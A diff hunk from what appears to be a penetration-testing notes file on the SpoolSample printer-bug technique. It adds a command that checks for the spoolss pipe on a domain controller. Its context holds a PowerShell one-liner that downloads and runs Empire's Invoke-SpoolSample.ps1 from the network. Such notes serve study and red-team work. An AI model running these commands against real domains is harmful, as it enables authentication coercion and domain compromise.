@@ -704,6 +704,8 @@ https://github.com/leechristensen/SpoolSample
 
 compiled binary available here - [Tool dump](https://github.com/conma293/mvp) 
 
+```dir \\dc01\pipe\spoolss```
+
 ```
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/exploitation/Invoke-SpoolSample.ps1")
 ```
